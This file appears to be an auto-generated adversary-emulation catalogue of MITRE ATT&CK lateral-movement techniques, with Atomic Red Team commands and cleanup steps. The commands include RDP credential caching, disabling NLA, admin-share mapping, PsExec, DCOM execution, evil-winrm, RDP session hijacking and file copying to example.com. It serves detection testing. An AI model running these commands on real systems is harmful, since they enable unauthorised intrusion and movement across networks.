# AutoStrike MITRE ATT&CK Techniques - lateral-movement
# Auto-generated by mitre-import script
# Source: MITRE ATT&CK STIX 2.1 + Atomic Red Team

- id: T1021.001
  name: Remote Desktop Protocol
  description: |-
    Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.

    Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citatio...
  tactic: lateral-movement
  platforms:
    - windows
  executors:
    - name: RDP to DomainController
      type: powershell
      platform: windows
      command: |-
        $Server=$ENV:logonserver.TrimStart("\")
        $User = Join-Path $Env:USERDOMAIN $ENV:USERNAME
        $Password="1password2!"
        cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password
        mstsc /v:$Server
        echo "RDP connection established"
      cleanup: |-
        $p=Tasklist /svc /fi "IMAGENAME eq mstsc.exe" /fo csv | convertfrom-csv
        if(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }
      timeout: 120
    - name: Changing RDP Port to Non Standard Port via Powershell
      type: powershell
      platform: windows
      command: |-
        Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value 4489
        New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4489
      cleanup: "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value 3389\nRemove-NetFirewallRule -DisplayName \"RDPPORTLatest-TCP-In\" -ErrorAction Ignore \nGet-Service TermService | Restart-Service -Force -ErrorAction Ignore"
      timeout: 120
      elevation_required: true
    - name: Changing RDP Port to Non Standard Port via Command_Prompt
      type: cmd
      platform: windows
      command: |-
        reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 4489 /f
        netsh advfirewall firewall add rule name="RDPPORTLatest-TCP-In" dir=in action=allow protocol=TCP localport=4489
      cleanup: |-
        reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 3389 /f >nul 2>&1
        netsh advfirewall firewall delete rule name="RDPPORTLatest-TCP-In" >nul 2>&1
        net stop TermService /y >nul 2>&1
        net start TermService >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Disable NLA for RDP via Command Prompt
      type: cmd
      platform: windows
      command: reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /d 0 /t REG_DWORD /f
      cleanup: reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /d 1 /t REG_DWORD -f >nul 2>&1
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1021/001
  is_safe: false
- id: T1021.002
  name: SMB/Windows Admin Shares
  description: |-
    Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.

    SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.

    Windo...
  tactic: lateral-movement
  platforms:
    - windows
  executors:
    - name: Map admin share
      type: cmd
      platform: windows
      command: cmd.exe /c "net use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator"
      timeout: 120
    - name: Map Admin Share PowerShell
      type: powershell
      platform: windows
      command: New-PSDrive -name g -psprovider filesystem -root \\Target\C$
      timeout: 120
    - name: Copy and Execute File with PsExec
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" \\localhost -accepteula -c C:\Windows\System32\cmd.exe'
      timeout: 120
      elevation_required: true
    - name: Execute command writing output to local Admin Share
      type: cmd
      platform: windows
      command: cmd.exe /Q /c hostname 1> \\127.0.0.1\ADMIN$\output.txt 2>&1
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1021/002
  is_safe: false
- id: T1021.003
  name: Distributed Component Object Model
  description: |-
    Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.

    The Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object c...
  tactic: lateral-movement
  platforms:
    - windows
  executors:
    - name: PowerShell Lateral Movement using MMC20
      type: powershell
      platform: windows
      command: '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","localhost")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")'
      timeout: 120
    - name: PowerShell Lateral Movement Using Excel Application Object
      type: powershell
      platform: windows
      command: |-
        copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
        $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","localhost"))
        $com.ActivateMicrosoftApp("5")
      cleanup: Remove-Item 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1021/003
  is_safe: false
- id: T1021.005
  name: VNC
  description: |-
    Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (“remote framebuffer”) protocol to enable users to remotely control another computer’s display by relaying the screen, mouse, and keyboard inputs over the network.(Citation: The Remote Framebuffer Protocol)

    VNC differs from [Remote Desktop Protocol](https://attack.mitre.or...
  tactic: lateral-movement
  platforms:
    - linux
    - windows
    - macos
  executors:
    - name: Enable Apple Remote Desktop Agent
      type: sh
      platform: macos
      command: sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -allowAccessFor -allUsers -privs -all -quiet
      cleanup: sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -deactivate -stop -configure -privs -none -quiet
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1021/005
  is_safe: false
- id: T1021.006
  name: Windows Remote Management
  description: |-
    Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.

    WinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).(Citation: Microsoft WinRM) It may be called with the `winrm` command or by any number of programs such as Po...
  tactic: lateral-movement
  platforms:
    - windows
  executors:
    - name: Enable Windows Remote Management
      type: powershell
      platform: windows
      command: Enable-PSRemoting -Force
      timeout: 120
      elevation_required: true
    - name: Remote Code Execution with PS Credentials Using Invoke-Command
      type: powershell
      platform: windows
      command: |-
        Enable-PSRemoting -Force
        Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}
      cleanup: Disable-PSRemoting -Force
      timeout: 120
    - name: WinRM Access with Evil-WinRM
      type: powershell
      platform: windows
      command: evil-winrm -i Target -u Domain\Administrator -p P@ssw0rd1
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1021/006
  is_safe: false
- id: T1091
  name: Replication Through Removable Media
  description: Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this m...
  tactic: lateral-movement
  tactics:
    - lateral-movement
    - initial-access
  platforms:
    - windows
  executors:
    - name: USB Malware Spread Simulation
      type: powershell
      platform: windows
      command: |-
        $RemovableDrives=@()
        $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter "drivetype=2" | select-object -expandproperty DeviceID
        ForEach ($Drive in $RemovableDrives)
        {
        write-host "Removable Drive Found:" $Drive
        New-Item -Path $Drive/T1091Test1.txt -ItemType "file" -Force -Value "T1091 Test 1 has created this file to simulate malware spread to removable drives."
        }
      cleanup: |-
        $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter "drivetype=2" | select-object -expandproperty DeviceID
        ForEach ($Drive in $RemovableDrives)
        {
        Remove-Item -Path $Drive\T1091Test1.txt -Force -ErrorAction Ignore
        }
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1091
  is_safe: false
- id: T1563.002
  name: RDP Hijacking
  description: |-
    Adversaries may hijack a legitimate user’s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services)

    Adversaries may perform RDP session hijacking which involves ...
  tactic: lateral-movement
  platforms:
    - windows
  executors:
    - name: RDP hijacking
      type: cmd
      platform: windows
      command: |-
        query user
        sc.exe create sesshijack binpath= "cmd.exe /k tscon 1337 /dest:rdp-tcp#55"
        net start sesshijack
      cleanup: sc.exe delete sesshijack >nul 2>&1
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1563/002
  is_safe: false
- id: T1570
  name: Lateral Tool Transfer
  description: |-
    Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.

    Adversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over [SMB/Windows Ad...
  tactic: lateral-movement
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Exfiltration Over SMB over QUIC (New-SmbMapping)
      type: powershell
      platform: windows
      command: |-
        New-SmbMapping -RemotePath '\\example.com\sales' -TransportType QUIC -SkipCertificateCheck
        copy 'C:\path\to\file.txt' 'Z:\'
      timeout: 120
      elevation_required: true
    - name: Exfiltration Over SMB over QUIC (NET USE)
      type: powershell
      platform: windows
      command: |-
        NET USE * '\\example.com\sales' /TRANSPORT:QUIC /SKIPCERTCHECK
        copy 'C:\path\to\file.txt' '*:\'
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1570
  is_safe: false
